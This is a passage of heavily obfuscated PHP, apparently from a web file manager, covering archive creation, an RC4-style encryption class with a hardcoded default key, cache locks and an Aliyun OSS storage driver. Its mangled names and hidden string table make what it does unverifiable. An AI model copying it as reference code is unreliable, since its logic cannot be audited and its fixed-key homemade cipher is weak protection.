(!file_exists($CÂ•«¶ÇÉº)) { show_json($Eâì©ß[1935], !1); } @rename($CÂ•«¶ÇÉº, $E™“µ‹›); goto B‘õ¢ÚïŸ§; aÎù±ëø™£: } static function create($Bù»¦ŒØ¦“, $eÌŠØçŠ›Š) { $aÄèˆ§­ˆ½ =& $_SERVER[´Ù×Íå‘ÄõÛ]; self::init(); $f£¤öÃŸ©Á = get_path_ext($Bù»¦ŒØ¦“); $dÊ˜Ş¬¥†ã = !1; if (self::checkIfType($f£¤öÃŸ©Á, $aÄèˆ§­ˆ½[301])) { if (kodZipArchive::support($aÄèˆ§­ˆ½[1015])) { return kodZipArchive::create($Bù»¦ŒØ¦“, $eÌŠØçŠ›Š); } $b‹Çä‡©¥È = new PclZip($Bù»¦ŒØ¦“); foreach ($eÌŠØçŠ›Š as $e–õ–ê÷ => $Fä¾‹ÕØ¹¯) { $Fä¾‹ÕØ¹¯ = str_replace($aÄèˆ§­ˆ½[469], $aÄèˆ§­ˆ½[8], $Fä¾‹ÕØ¹¯); $D‰‚óñ•„ = Kodio::clear(get_path_father($Fä¾‹ÕØ¹¯)); if ($e–õ–ê÷ == 0) { $dÊ˜Ş¬¥†ã = $b‹Çä‡©¥È->create($Fä¾‹ÕØ¹¯, PCLZIP_OPT_REMOVE_PATH, $D‰‚óñ•„, PCLZIP_CB_PRE_FILE_NAME, $aÄèˆ§­ˆ½[1937]); continue; } $dÊ˜Ş¬¥†ã = $b‹Çä‡©¥È->add($Fä¾‹ÕØ¹¯, PCLZIP_OPT_REMOVE_PATH, $D‰‚óñ•„, PCLZIP_CB_PRE_FILE_NAME, $aÄèˆ§­ˆ½[1937]); } } else { if (self::checkIfType($f£¤öÃŸ©Á, $aÄèˆ§­ˆ½[1908])) { foreach ($eÌŠØçŠ›Š as $e–õ–ê÷ => $Fä¾‹ÕØ¹¯) { $Fä¾‹ÕØ¹¯ = str_replace($aÄèˆ§­ˆ½[469], $aÄèˆ§­ˆ½[8], $Fä¾‹ÕØ¹¯); $D‰‚óñ•„ = Kodio::clear(get_path_father($Fä¾‹ÕØ¹¯)); if ($e–õ–ê÷ == 0) { $dÊ˜Ş¬¥†ã = PclTarCreate($Bù»¦ŒØ¦“, array($Fä¾‹ÕØ¹¯), $f£¤öÃŸ©Á, null, $D‰‚óñ•„); continue; } $dÊ˜Ş¬¥†ã = PclTarAddList($Bù»¦ŒØ¦“, array($Fä¾‹ÕØ¹¯), $aÄèˆ§­ˆ½[33], $D‰‚óñ•„, $f£¤öÃŸ©Á); } } } return $dÊ˜Ş¬¥†ã; } } class Mcrypt { public static $defaultKey = "\141\41\x74\141\x6b\x41\72\x64\x6c\x6d\x63\x6c\x64\105\x76\x2c\x65"; public static function encode($dÀ£„Ü’œâ, $fòÊ†—®‰´ = '', $c®ôí–‘ = 0, $b‘ÇÅïÅÙË = '') { goto FÒ£ÇÍŞï; FÒ£ÇÍŞï: $Bå†éŠÀÜ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $eßå½©¥İÖ = 4; $fòÊ†—®‰´ = md5($fòÊ†—®‰´ ? $fòÊ†—®‰´ : self::$defaultKey); goto a‹«“ƒä¸À; a‹«“ƒä¸À: $b±·‰º„ÊÍ = md5(substr($fòÊ†—®‰´, 0, 16)); $AÆèÜôğÀ° = md5(substr($fòÊ†—®‰´, 16, 16)); $b‘ÇÅïÅÙË = $b‘ÇÅïÅÙË ? $b‘ÇÅïÅÙË : md5(microtime()); goto câ¡‚Ÿ½¿¯; dº»›¬´ÅÔ: $AŒÑŠºƒİô = str_replace(array($Bå†éŠÀÜ[284], $Bå†éŠÀÜ[8], $Bå†éŠÀÜ[910]), array($Bå†éŠÀÜ[412], $Bå†éŠÀÜ[70], $Bå†éŠÀÜ[91]), $AŒÑŠºƒİô); return $AŒÑŠºƒİô; goto AÃŠÈÆö÷; A¿ê‘ö¡: $AŒÑŠºƒİô = $Bå†éŠÀÜ[33]; for ($aò¢¬§Ü×– = $cÄ™ßÉĞÈÄ = $c ã‘ë°ï = 0; $c ã‘ë°ï < $E ÄŒíÊÑ³; $c ã‘ë°ï++) { $aò¢¬§Ü×– = ($aò¢¬§Ü×– + 1) % 256; $cÄ™ßÉĞÈÄ = ($cÄ™ßÉĞÈÄ + $Fµù›Şâ[$aò¢¬§Ü×–]) % 256; $d¹Ê¢““£ = $Fµù›Şâ[$aò¢¬§Ü×–]; $Fµù›Şâ[$aò¢¬§Ü×–] = $Fµù›Şâ[$cÄ™ßÉĞÈÄ]; $Fµù›Şâ[$cÄ™ßÉĞÈÄ] = $d¹Ê¢““£; $AŒÑŠºƒİô .= chr(ord($dÀ£„Ü’œâ[$c ã‘ë°ï]) ^ $Fµù›Şâ[($Fµù›Şâ[$aò¢¬§Ü×–] + $Fµù›Şâ[$cÄ™ßÉĞÈÄ]) % 256]); } $AŒÑŠºƒİô = $D¼æŒã… . str_replace($Bå†éŠÀÜ[910], $Bå†éŠÀÜ[33], base64_encode($AŒÑŠºƒİô)); goto dº»›¬´ÅÔ; C›ñèó–è: $dÀ£„Ü’œâ = sprintf($Bå†éŠÀÜ[1938], $c®ôí–‘ ? $c®ôí–‘ + time() : 0) . substr(md5($dÀ£„Ü’œâ . $AÆèÜôğÀ°), 0, 16) . $dÀ£„Ü’œâ; $E ÄŒíÊÑ³ = strlen($dÀ£„Ü’œâ); $Eí‡ö‹êÍÒ = array(); goto FµÌ–ËÌ; FµÌ–ËÌ: for ($c ã‘ë°ï = 0; $c ã‘ë°ï <= 255; $c ã‘ë°ï++) { $Eí‡ö‹êÍÒ[$c ã‘ë°ï] = ord($CÚÊÊµÛèï[$c ã‘ë°ï % $a”Å‘‘«¯°]); } $Fµù›Şâ = range(0, 255); for ($cÄ™ßÉĞÈÄ = $c ã‘ë°ï = 0; $c ã‘ë°ï < 256; $c ã‘ë°ï++) { $cÄ™ßÉĞÈÄ = ($cÄ™ßÉĞÈÄ + $Fµù›Şâ[$c ã‘ë°ï] + $Eí‡ö‹êÍÒ[$c ã‘ë°ï]) % 256; $d¹Ê¢““£ = $Fµù›Şâ[$c ã‘ë°ï]; $Fµù›Şâ[$c ã‘ë°ï] = $Fµù›Şâ[$cÄ™ßÉĞÈÄ]; $Fµù›Şâ[$cÄ™ßÉĞÈÄ] = $d¹Ê¢““£; } goto A¿ê‘ö¡; câ¡‚Ÿ½¿¯: $D¼æŒã… = substr($b‘ÇÅïÅÙË, -$eßå½©¥İÖ); $CÚÊÊµÛèï = $b±·‰º„ÊÍ . md5($b±·‰º„ÊÍ . $D¼æŒã…); $a”Å‘‘«¯° = strlen($CÚÊÊµÛèï); goto C›ñèó–è; AÃŠÈÆö÷: } public static function decode($d“ÒßÇ‚©, $f‰­÷¯¤ÊÂ = '') { goto e•ã©×Áù; f‹ì”–Íò: if (($a‘Ñ’ÉäÏÎ == 0 || $a‘Ñ’ÉäÏÎ - time() > 0) && substr($Cçïõ‡ã—, 10, 16) == substr(md5(substr($Cçïõ‡ã—, 26) . $AËí®ìğÛ), 0, 16)) { return substr($Cçïõ‡ã—, 26); } else { return $fêÙËŠÁºƒ[33]; } goto cŒÄ‹æÅ; e•ã©×Áù: $fêÙËŠÁºƒ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $d“ÒßÇ‚© = str_replace(array($fêÙËŠÁºƒ[412], $fêÙËŠÁºƒ[70], $fêÙËŠÁºƒ[91]), array($fêÙËŠÁºƒ[284], $fêÙËŠÁºƒ[8], $fêÙËŠÁºƒ[910]), $d“ÒßÇ‚©); $c†êáƒÌÏï = 4; goto cÎ¼•’šÄå; b”Ãí‹ùá: for ($EÕ«®ÉíšÕ = 0; $EÕ«®ÉíšÕ <= 255; $EÕ«®ÉíšÕ++) { $B‡ì–Ú°‰[$EÕ«®ÉíšÕ] = ord($eõÑÜÖº¼«[$EÕ«®ÉíšÕ % $B½ŒëãØ]); } $Eç–äĞªÚß = range(0, 255); for ($FåŠ àÖÚ¶ = $EÕ«®ÉíšÕ = 0; $EÕ«®ÉíšÕ < 256; $EÕ«®ÉíšÕ++) { $FåŠ àÖÚ¶ = ($FåŠ àÖÚ¶ + $Eç–äĞªÚß[$EÕ«®ÉíšÕ] + $B‡ì–Ú°‰[$EÕ«®ÉíšÕ]) % 256; $a’Ÿ‘Ùòï = $Eç–äĞªÚß[$EÕ«®ÉíšÕ]; $Eç–äĞªÚß[$EÕ«®ÉíšÕ] = $Eç–äĞªÚß[$FåŠ àÖÚ¶]; $Eç–äĞªÚß[$FåŠ àÖÚ¶] = $a’Ÿ‘Ùòï; } goto Eˆµ£¶õÇ; C³§ÌÅ¶Ú•: $d“ÒßÇ‚© = base64_decode(substr($d“ÒßÇ‚©, $c†êáƒÌÏï)); $d½¬­Á†Åˆ = strlen($d“ÒßÇ‚©); $B‡ì–Ú°‰ = array(); goto b”Ãí‹ùá; a¸ƒµ§ÉÉĞ: $bŠŠÒŠƒÕË = substr($d“ÒßÇ‚©, 0, $c†êáƒÌÏï); $eõÑÜÖº¼« = $cÚãêåç÷ . md5($cÚãêåç÷ . $bŠŠÒŠƒÕË); $B½ŒëãØ = strlen($eõÑÜÖº¼«); goto C³§ÌÅ¶Ú•; cÎ¼•’šÄå: $f‰­÷¯¤ÊÂ = md5($f‰­÷¯¤ÊÂ ? $f‰­÷¯¤ÊÂ : self::$defaultKey); $cÚãêåç÷ = md5(substr($f‰­÷¯¤ÊÂ, 0, 16)); $AËí®ìğÛ = md5(substr($f‰­÷¯¤ÊÂ, 16, 16)); goto a¸ƒµ§ÉÉĞ; Eˆµ£¶õÇ: $Cçïõ‡ã— = $fêÙËŠÁºƒ[33]; for ($a…é­‘®Å = $FåŠ àÖÚ¶ = $EÕ«®ÉíšÕ = 0; $EÕ«®ÉíšÕ < $d½¬­Á†Åˆ; $EÕ«®ÉíšÕ++) { $a…é­‘®Å = ($a…é­‘®Å + 1) % 256; $FåŠ àÖÚ¶ = ($FåŠ àÖÚ¶ + $Eç–äĞªÚß[$a…é­‘®Å]) % 256; $a’Ÿ‘Ùòï = $Eç–äĞªÚß[$a…é­‘®Å]; $Eç–äĞªÚß[$a…é­‘®Å] = $Eç–äĞªÚß[$FåŠ àÖÚ¶]; $Eç–äĞªÚß[$FåŠ àÖÚ¶] = $a’Ÿ‘Ùòï; $Cçïõ‡ã— .= chr(ord($d“ÒßÇ‚©[$EÕ«®ÉíšÕ]) ^ $Eç–äĞªÚß[($Eç–äĞªÚß[$a…é­‘®Å] + $Eç–äĞªÚß[$FåŠ àÖÚ¶]) % 256]); } $a‘Ñ’ÉäÏÎ = intval(substr($Cçïõ‡ã—, 0, 10)); goto f‹ì”–Íò; cŒÄ‹æÅ: } } define($_SERVER[´Ù×Íå‘ÄõÛ][1939], 1); goto Añ›Î„î½; CÁ‚¥Œ„İø: class CacheLockRedis { public function lock($aÛ–İÎÈ¸â, $båÍÙÀ«­Ã = 10) { $DïøŠ˜…²ì = Cache::init(); $cëôë—®äŒ = microtime(!0) + $båÍÙÀ«­Ã; while (microtime(!0) < $cëôë—®äŒ) { $bš¡¢†”„Ä = $DïøŠ˜…²ì->get($aÛ–İÎÈ¸â); if (!$bš¡¢†”„Ä) { $BŞÌ¹“¸êñ = $DïøŠ˜…²ì->setLock($aÛ–İÎÈ¸â, $cëôë—®äŒ, $båÍÙÀ«­Ã); if ($BŞÌ¹“¸êñ) { return !0; } } else { if ($bš¡¢†”„Ä < microtime(!0)) { $DïøŠ˜…²ì->set($aÛ–İÎÈ¸â, $cëôë—®äŒ, $cëôë—®äŒ); if ($DïøŠ˜…²ì->get($aÛ–İÎÈ¸â) === $bš¡¢†”„Ä) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($AÜíôŠâ›‘) { return Cache::init()->get($AÜíôŠâ›‘); } public function unlock($a­ÆÜ¦¨ª) { return Cache::init()->remove($a­ÆÜ¦¨ª); } } class CacheLockMemcached { public function lock($däªëŒáé, $Bææ¿óì“ = 0) { $fÀİÈóßø = Cache::init(); $F†ò èøß­ = microtime(!0) + $Bææ¿óì“; while (microtime(!0) < $F†ò èøß­) { $Aš†½©’ = $fÀİÈóßø->get($däªëŒáé); if (!$Aš†½©’ || $Aš†½©’ < microtime(!0)) { $F‚£™íÑçí = $fÀİÈóßø->handle->add($däªëŒáé, $F†ò èøß­, $Bææ¿óì“); if ($F‚£™íÑçí) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($d¹Ãò®Ü‡) { return Cache::init()->get($d¹Ãò®Ü‡); } public function unlock($E›®­Ø¦†) { return Cache::init()->remove($E›®­Ø¦†); } } class CacheLockDatabase { public function lock($AÙ–®Üîê‹, $eæñÃô”Ù• = 0) { $CÃ»‹İƒ° = Model($_SERVER[´Ù×Íå‘ÄõÛ][757]); $AÅŞäªÅÂ† = microtime(!0) + $eæñÃô”Ù•; while (microtime(!0) < $AÅŞäªÅÂ†) { $eİ›Â±Å° = $CÃ»‹İƒ°->get($AÙ–®Üîê‹); if (!$eİ›Â±Å° || $eİ›Â±Å° < microtime(!0)) { $fÃÀ»‹¾İ“ = $CÃ»‹İƒ°->set($AÙ–®Üîê‹, $AÅŞäªÅÂ†); if ($fÃÀ»‹¾İ“) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($eá“ÎÛ¡Ôî) { return Model($_SERVER[´Ù×Íå‘ÄõÛ][757])->get($eá“ÎÛ¡Ôî); } public function unlock($CĞİ§àÇã) { Model($_SERVER[´Ù×Íå‘ÄõÛ][757])->remove($CĞİ§àÇã); } } goto Eâ¹Èï¿Ùƒ; E•Â¢Ô¸Ä: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($FÏÆ‘¾›) { parent::__construct(); include_once SDK_DIR . $_SERVER[´Ù×Íå‘ÄõÛ][1175]; $this->_init($FÏÆ‘¾›); } public function _init($EË¥¢·ïÇÅ) { foreach ($EË¥¢·ïÇÅ as $dÅº‡ÒÅÑÁ => $c×øÅäß´ö) { if (isset($this->{$dÅº‡ÒÅÑÁ})) { $this->{$dÅº‡ÒÅÑÁ} = $c×øÅäß´ö; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[´Ù×Íå‘ÄõÛ][1176], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto eõŒ»æ—ô; eõŒ»æ—ô: $B‹ù‡±°‡ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $fÍäÉ§ÙÄÚ = new OSS\Model\CorsConfig(); $A§à‚ğíˆÊ = new OSS\Model\CorsRule(); goto EŞé¶Ó±è¢; a»Ô¢‰Ë£ˆ: $A§à‚ğíˆÊ->setMaxAgeSeconds(600); $A§à‚ğíˆÊ->addExposeHeader($B‹ù‡±°‡[1182]); $A§à‚ğíˆÊ->addAllowedHeader($B‹ù‡±°‡[1177]); goto BÔƒ³’†¶; EŞé¶Ó±è¢: $A§à‚ğíˆÊ->addAllowedOrigin($B‹ù‡±°‡[1177]); $A§à‚ğíˆÊ->addAllowedMethod($B‹ù‡±°‡[1178]); $A§à‚ğíˆÊ->addAllowedMethod($B‹ù‡±°‡[1179]); goto Fƒ–áìÆ¸´; Fƒ–áìÆ¸´: $A§à‚ğíˆÊ->addAllowedMethod($B‹ù‡±°‡[1180]); $A§à‚ğíˆÊ->addAllowedMethod($B‹ù‡±°‡[1181]); $A§à‚ğíˆÊ->addAllowedMethod($B‹ù‡±°‡[155]); goto a»Ô¢‰Ë£ˆ; BÔƒ³’†¶: $fÍäÉ§ÙÄÚ->addRule($A§à‚ğíˆÊ); try { $this->client->putBucketCors($this->bucket, $fÍäÉ§ÙÄÚ); } catch (OSS\Core\OssException $a¼Á½Í®´) { return !1; } return !0; goto B°Ì÷Õ„¤; B°Ì÷Õ„¤: } public function getBucketCors() { goto fõ³Ä¢”İ; fõ³Ä¢”İ: $BÔÏÌÈ†‹ù =& $_SERVER[´Ù×Íå‘ÄõÛ]; $FÜÙ÷¸Š°Ó = null; try { $FÜÙ÷¸Š°Ó = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $f…ğ •Ú) { return null; } goto CŠß”ˆØ‰š; F»‚ÏÆÑæ: return array($BÔÏÌÈ†‹ù[175] => isset($fº”­ÃˆŒ„[0]) ? $fº”­ÃˆŒ„[0] : $BÔÏÌÈ†‹ù[33], $BÔÏÌÈ†‹ù[179] => $Aç´¤ÅÛ¿, $BÔÏÌÈ†‹ù[1183] => $Fâ„É®², $BÔÏÌÈ†‹ù[1184] => isset($b»Œğ©—ã‹[0]) ? $b»Œğ©—ã‹[0] : $BÔÏÌÈ†‹ù[33], $BÔÏÌÈ†‹ù[177] => isset($c×²Â¬÷‹[0]) ? $c×²Â¬÷‹[0] : $BÔÏÌÈ†‹ù[33]); goto CŒ“±ã¼æ; CŠß”ˆØ‰š: if (!$FÜÙ÷¸Š°Ó || !($c©‡¤ÄšÇ™ = $FÜÙ÷¸Š°Ó->getRules())) { return null; } $fº”­ÃˆŒ„ = $c©‡¤ÄšÇ™[0]->getAllowedOrigins(); $Aç´¤ÅÛ¿ = $c©‡¤ÄšÇ™[0]->getAllowedMethods(); goto EŞ„ÇÔĞ„; EŞ„ÇÔĞ„: $Fâ„É®² = $c©‡¤ÄšÇ™[0]->getMaxAgeSeconds(); $b»Œğ©—ã‹ = $c©‡¤ÄšÇ™[0]->getExposeHeaders(); $c×²Â¬÷‹ = $c©‡¤ÄšÇ™[0]->getAllowedHeaders(); goto F»‚ÏÆÑæ; CŒ“±ã¼æ: } public function isBucketCors() { goto c¥õ—»Ô‰; c¥õ—»Ô‰: $eÂàËˆÓÅ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $d§Œô»¿ö­ = $this->getBucketCors(); if (!$d§Œô»¿ö­ || !is_array($d§Œô»¿ö­)) { return !1; } goto fà¥­œÀÓ½; CÕ‰”Æí: $CÍÂæµÒ„ã = array($eÂàËˆÓÅ[180], $eÂàËˆÓÅ[181], $eÂàËˆÓÅ[182], $eÂàËˆÓÅ[183], $eÂàËˆÓÅ[184]); $FóœØÕ‚ = array_diff($CÍÂæµÒ„ã, $CÃİõ½†œ•); return empty($FóœØÕ‚); goto eÈ±µĞ“ƒŒ; fà¥­œÀÓ½: if ($d§Œô»¿ö­[$eÂàËˆÓÅ[175]] != $eÂàËˆÓÅ[176] || $d§Œô»¿ö­[$eÂàËˆÓÅ[177]] != $eÂàËˆÓÅ[176]) { return !1; } $CÃİõ½†œ• = array_map($eÂàËˆÓÅ[178], $d§Œô»¿ö­[$eÂàËˆÓÅ[179]]); if (!is_array($CÃİõ½†œ•)) { $CÃİõ½†œ• = array(); } goto CÕ‰”Æí; eÈ±µĞ“ƒŒ: } public function mkfile($f¦˜ù–, $dæ³Ï³‘ò¨ = '', $Bì§Ó÷Ÿœê = REPEAT_RENAME) { $bŠ»Şòõ—Ö = $this->setContent($f¦˜ù–, $dæ³Ï³‘ò¨); if ($bŠ»Şòõ—Ö !== !1) { return $this->getPathOuter($f¦˜ù–); } return !1; } public function mkdir($cáš¬‚œ³, $c—İƒÖâŸ³ = REPEAT_SKIP) { if ($this->_isFolder($cáš¬‚œ³)) { return $this->getPathOuter($cáš¬‚œ³); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($cáš¬‚œ³)); } catch (OSS\Core\OssException $Eî®Û‡ä§·) { return !1; } return $this->getPathOuter($cáš¬‚œ³); } private function fileList($C‚õŠÑ…ñ¬, $FƒµëÓïç = '', $bÖÍ·¤óé = 0) { goto Aß‹¤¯œ½…; Bâ§²¢™µÓ: while (!0) { $dì‡ËÛ›ì = array($e±†›„ğã[1185] => $FƒµëÓïç, $e±†›„ğã[186] => $aã¢ãà, $e±†›„ğã[1186] => $a¬£ªÄÇ®¬, $e±†›„ğã[1187] => $A™åó”ïÈ); try { $e¥´Íøñé¸ = $this->client->listObjects($this->bucket, $dì‡ËÛ›ì); } catch (OSS\Core\OssException $E¿ª•íÑ¸) { break; } $A™åó”ïÈ = $e¥´Íøñé¸->getNextMarker(); $cËÁ¼±Œ¹ = $e¥´Íøñé¸->getObjectList(); $d×¾ñæÂèä = $e¥´Íøñé¸->getPrefixList(); foreach ($cËÁ¼±Œ¹ as $B¨áÔÓéÆÎ) { if ($B¨áÔÓéÆÎ->getKey() == $aã¢ãà) { continue; } $eÅîÄµÂ‰ó = $B¨áÔÓéÆÎ->getKey(); if ($bÖÍ·¤óé) { $eÅîÄµÂ‰ó = array($e±†›„ğã[28] => $eÅîÄµÂ‰ó, $e±†›„ğã[77] => $B¨áÔÓéÆÎ->getSize(), $e±†›„ğã[190] => strtotime($B¨áÔÓéÆÎ->getLastModified())); } $Aä‘µÀ¿ßï[] = $eÅîÄµÂ‰ó; } foreach ($d×¾ñæÂèä as $Bå¨˜Š¤Ç÷) { $Fä¥á”âæ[] = $Bå¨˜Š¤Ç÷->getPrefix(); } if ($A™åó”ïÈ === $e±†›„ğã[33]) { break; } } return array($e±†›„ğã[74] => $Fä¥á”âæ, $e±†›„ğã[73] => $Aä‘µÀ¿ßï); goto fÁÍÌ¡Ñª¦; E²Ş½ã†š¢: $A™åó”ïÈ = $e±†›„ğã[33]; $a¬£ªÄÇ®¬ = 1000; $Fä¥á”âæ = $Aä‘µÀ¿ßï = array(); goto Bâ§²¢™µÓ; Aß‹¤¯œ½…: $e±†›„ğã =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C‚õŠÑ…ñ¬ = trim($C‚õŠÑ…ñ¬, $e±†›„ğã[8]); $aã¢ãà = empty($C‚õŠÑ…ñ¬) ? $e±†›„ğã[33] : $C‚õŠÑ…ñ¬ . $e±†›„ğã[8]; goto E²Ş½ã†š¢; fÁÍÌ¡Ñª¦: } public function copyFile($då‘–Ò’‘ê, $D®Ì÷²ŠÙÍ) { $C¸œ¸øİƒÕ = $this->size($då‘–Ò’‘ê); if ($C¸œ¸øİƒÕ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $då‘–Ò’‘ê, $this->bucket, $this->pathEncode($D®Ì÷²ŠÙÍ)); } catch (OSS\Core\OssException $f·„ïàÊ•±) { return !1; } return $this->getPathOuter($D®Ì÷²ŠÙÍ); } $AÛºÔ÷ù‘š = $this->multiCopyObject($då‘–Ò’‘ê, $D®Ì÷²ŠÙÍ, $C¸œ¸øİƒÕ); return $AÛºÔ÷ù‘š ? $this->getPathOuter($D®Ì÷²ŠÙÍ) : !1; } private function multiCopyObject($B»Õ–Ù©Ø«, $b‹İÏ¡ß–Ø, $Bó¿î„ˆÂ°) { $c¼¦ĞŸØëÓ =& $_SERVER[´Ù×Íå‘ÄõÛ]; try { goto B—Ùê³±°; aÖ“¦¼²: $CöäÇ¸ŠÀ = 1024 * 1024 * 10; $aàå•ôëº› = $this->client->generateMultiuploadParts($Bó¿î„ˆÂ°, $CöäÇ¸ŠÀ); foreach ($aàå•ôëº› as $dòŠ»­°î‹ => $eÎ—¯ŞĞ²á) { $D¢æÉ­è–ƒ = $f‹ÄÁğ¦Š˜ + (int) $eÎ—¯ŞĞ²á[$c¼¦ĞŸØëÓ[1189]]; $Cìº‘–Æø» = (int) $eÎ—¯ŞĞ²á[$c¼¦ĞŸØëÓ[325]] + $D¢æÉ­è–ƒ - 1; $f¨£ĞÈÏêÈ = array($c¼¦ĞŸØëÓ[1190] => $D¢æÉ­è–ƒ, $c¼¦ĞŸØëÓ[1191] => $Cìº‘–Æø»); $Cß¨¥ğ¿½œ[] = $this->client->uploadPartCopy($this->bucket, $B»Õ–Ù©Ø«, $this->bucket, $this->pathEncode($b‹İÏ¡ß–Ø), $DÚÅ¾¥À—, $f„¯†’ØÌç, $f¨£ĞÈÏêÈ); $DÚÅ¾¥À— = $DÚÅ¾¥À— + 1; } goto FèƒÛ¥×ğ; D•àİ†À´è: $DÚÅ¾¥À— = 1; $f‹ÄÁğ¦Š˜ = 0; $Cß¨¥ğ¿½œ = array(); goto aÖ“¦¼²; B—Ùê³±°: $Fö‚„ñ—ÎÅ = array(); if ($EÎá†‚ÛŠ = $this->hashMd5($B»Õ–Ù©Ø«)) { $Fö‚„ñ—ÎÅ = array(OSS\OssClient::OSS_HEADERS => array($c¼¦ĞŸØëÓ[1188] => $EÎá†‚ÛŠ)); } $f„¯†’ØÌç = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($b‹İÏ¡ß–Ø), $Fö‚„ñ—ÎÅ); goto D•àİ†À´è; FèƒÛ¥×ğ: $A«“Ò¹Û£  = array(); foreach ($Cß¨¥ğ¿½œ as $dòŠ»­°î‹ => $D©¸ñ‚Îøë) { $A«“Ò¹Û£ [] = array($c¼¦ĞŸØëÓ[1192] => $dòŠ»­°î‹ + 1, $c¼¦ĞŸØëÓ[1193] => $D©¸ñ‚Îøë); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($b‹İÏ¡ß–Ø), $f„¯†’ØÌç, $A«“Ò¹Û£ ); goto Dˆ¢¬Á‚ª; Dˆ¢¬Á‚ª: } catch (OSS\Core\OssException $AŞ­¸‘¿¼‘) { return !1; } return !0; } public function moveFile($DîĞÁ¥ã¡, $Få–¡´ğëÉ) { if ($this->copyFile($DîĞÁ¥ã¡, $Få–¡´ğëÉ)) { $this->remove($DîĞÁ¥ã¡); return $this->getPathOuter($Få–¡´ğëÉ); } return !1; } public function delFile($cÒ±£Ó¢®¶) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($cÒ±£Ó¢®¶)); } catch (OSS\Core\OssException $FºÃ¦‰•–Ø) { return !1; } return !0; } public function delFolder($A§ì†Í¾Ë) { $B¸“Ğ¹Û =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Eí¸‹½ŒŒ¬ = $this->fileList($A§ì†Í¾Ë); if (!empty($A§ì†Í¾Ë) && !in_array(trim($A§ì†Í¾Ë, $B¸“Ğ¹Û[8]) . $B¸“Ğ¹Û[8], $Eí¸‹½ŒŒ¬[$B¸“Ğ¹Û[73]])) { $Eí¸‹½ŒŒ¬[$B¸“Ğ¹Û[73]][] = trim($A§ì†Í¾Ë, $B¸“Ğ¹Û[8]) . $B¸“Ğ¹Û[8]; } foreach (array_chunk($Eí¸‹½ŒŒ¬[$B¸“Ğ¹Û[73]], 1000) as $F¶©–æğî©) { try { $this->client->deleteObjects($this->bucket, $F¶©–æğî©); } catch (OSS\Core\OssException $fµÊ³åÍµê) { continue; } } return !0; } public function rename($Báğ‰Ø¯, $fêÛğ†¾Ä) { return $this->renameObject($Báğ‰Ø¯, $fêÛğ†¾Ä); } private function fileInfo($e…Æª¥Û« , $bš¾…ß†ù¡ = array()) { goto aõï¸ò©µ; aõï¸ò©µ: $fçÕ”ƒ²ÜÛ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $déù‘Ï¥‹í = array($fçÕ”ƒ²ÜÛ[28] => $this->pathThis($e…Æª¥Û« ), $fçÕ”ƒ²ÜÛ[75] => $this->getPathOuter($e…Æª¥Û« ), $fçÕ”ƒ²ÜÛ[29] => $fçÕ”ƒ²ÜÛ[167], $fçÕ”ƒ²ÜÛ[187] => 0, $fçÕ”ƒ²ÜÛ[107] => 0, $fçÕ”ƒ²ÜÛ[77] => 0, $fçÕ”ƒ²ÜÛ[160] => $this->ext($e…Æª¥Û« ), $fçÕ”ƒ²ÜÛ[188] => !0, $fçÕ”ƒ²ÜÛ[189] => !0); if (empty($bš¾…ß†ù¡)) { $BÅ†Á‚®ÙÊ = $this->objectMeta($e…Æª¥Û« ); if (!$BÅ†Á‚®ÙÊ) { return $déù‘Ï¥‹í; } $bš¾…ß†ù¡ = array($fçÕ”ƒ²ÜÛ[107] => strtotime($BÅ†Á‚®ÙÊ[$fçÕ”ƒ²ÜÛ[1194]]), $fçÕ”ƒ²ÜÛ[77] => $BÅ†Á‚®ÙÊ[$fçÕ”ƒ²ÜÛ[1195]] + 0); } goto a˜òì¯©ß; e’àİšÎ“‰: return $déù‘Ï¥‹í; goto CŠ°ãÆ¸é›; a˜òì¯©ß: if (isset($bš¾…ß†ù¡[$fçÕ”ƒ²ÜÛ[77]])) { $déù‘Ï¥‹í[$fçÕ”ƒ²ÜÛ[77]] = $bš¾…ß†ù¡[$fçÕ”ƒ²ÜÛ[77]]; } if (isset($bš¾…ß†ù¡[$fçÕ”ƒ²ÜÛ[107]])) { $déù‘Ï¥‹í[$fçÕ”ƒ²ÜÛ[107]] = $bš¾…ß†ù¡[$fçÕ”ƒ²ÜÛ[107]]; } if (isset($bš¾…ß†ù¡[$fçÕ”ƒ²ÜÛ[190]]) && !trim($déù‘Ï¥‹í[$fçÕ”ƒ²ÜÛ[107]])) { $déù‘Ï¥‹í[$fçÕ”ƒ²ÜÛ[107]] = $bš¾…ß†ù¡[$fçÕ”ƒ²ÜÛ[190]]; } goto e’àİšÎ“‰; CŠ°ãÆ¸é›: } private function folderInfo($aô¸­ìâØ, $eÃ½”ùïÖİ = array()) { $FÔ‰¼¦Ûßù =& $_SERVER[´Ù×Íå‘ÄõÛ]; $dÂŒÔïçá° = array($FÔ‰¼¦Ûßù[28] => $this->pathThis($aô¸­ìâØ), $FÔ‰¼¦Ûßù[75] => $this->getPathOuter($FÔ‰¼¦Ûßù[8] . $aô¸­ìâØ), $FÔ‰¼¦Ûßù[29] => $FÔ‰¼¦Ûßù[76], $FÔ‰¼¦Ûßù[187] => 0, $FÔ‰¼¦Ûßù[107] => 0, $FÔ‰¼¦Ûßù[188] => !0, $FÔ‰¼¦Ûßù[189] => !0); if (empty($eÃ½”ùïÖİ)) { $aô¸­ìâØ = 